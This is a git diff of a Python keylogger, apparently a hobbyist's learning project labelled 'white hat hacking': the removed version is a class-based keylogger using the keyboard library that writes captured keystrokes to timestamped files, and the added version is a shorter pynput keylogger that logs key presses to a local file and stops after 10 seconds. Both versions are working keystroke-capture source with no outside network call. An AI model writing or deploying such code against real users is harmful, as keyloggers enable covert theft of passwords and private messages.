@@ -1,90 +1,44 @@
-# First Attempt at White Hat Hacking/Cyberscurity Programming
-# By Ben Alvaro 
-# 03/05/2024
-
-
-
-
+from pynput import keyboard
+from threading import Timer
 import sys
+import datetime
 
 
+def get_char(key):
+    try:
+        return key.char
+    except AttributeError:
+        return str(key)
 
-def keylogger(starter):
-    import keyboard #for logging
-    from threading import Timer
-    from datetime import datetime
-    SEND_REPORT_EVERY =  10
-    print("Keylogger has started")
-    
-    global keylogger1
-    
-    class Keylogger:
-        def __init__(self, interval, report_method="file"):
-            self.interval = interval
-            self.report_method = report_method
-            self.log = ""
 
-            self.start_dt = datetime.now()
-            self.end_dt = datetime.now()
-            
-        def callback(self, event):
-            name = event.name
-            if len(name) > 1:
-                if name == "space":
-                    name = " "
-                elif name == "enter":
-                    name = "[ENTER]\n"
-                elif name == "decimal":
-                    name = "."
-                else:
-                    name = name.replace(" ", "_")
-                    name = f"[{name.upper()}]"
-            self.log += name
+def on_press(key):
+    print(key)
+    if str(key) == "Key.enter":
+            key = "[ENTER]\n"
+    with open(filename, 'a') as logs:
+        logs.write(get_char(key))
 
-        def update_filename(self):
-            start_dt_str = str(self.start_dt)[:-7].replace(" ", "_").replace(":", "")
-            end_dt_str = str(self.end_dt)[:-7].replace(" ", "_").replace(":", "")
-            self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
 
-        def report_to_file(self):
-            with open(f"{self.filename}.txt", "w") as f:
-                print(self.log, file=f)
-            print (f"[+] Saved {self.filename}.txt")
-            print("Done and dusted")
-            keylogger(0)
-            raise SystemExit("Exiting keylogger gracefully")
-                
-            
-        def report(self):
+def stop_logging():
+    print("Exiting keylogger...")
+    sys.exit()
 
-            if self.log:
-                self.end_dt = datetime.now()
-                self.update_filename()
-                self.report_to_file()
-                self.start_dt = datetime.now()
-            self.log = ""
-            print("Whats good")
-            timer = Timer(interval=self.interval, function=self.report)
-            timer.daemon = True
-            timer.start()
-            
 
-        def start(self):
-            counter = 0
-            self.start_dt = datetime.now()
-            keyboard.on_release(callback=self.callback)
-            self.report()
-            print(f"{datetime.now()} - Started keylogger")
-            keyboard.wait()
-    print("Hunky Dory")
-    if starter == 1:
-        starter = 0
-        print(str(starter))
-        keylogger1 = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
-        keylogger1.start()
-        
-    elif starter == 0:
-        print("Lmaoooo")
-        quit()
-    
-print("What's good team")   
+def start_keylogger():
+    now = datetime.datetime.now()
+    timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
+    global filename
+    filename = f"keylogs_{timestamp}.txt"
+
+    listener = keyboard.Listener(
+        on_press=on_press,
+    )
+    listener.start()
+
+    # Schedule the stop_logging function to run after 10 seconds
+    timer = Timer(10, stop_logging)
+    timer.start()
+
+
+if __name__ == '__main__':
+    start_keylogger()
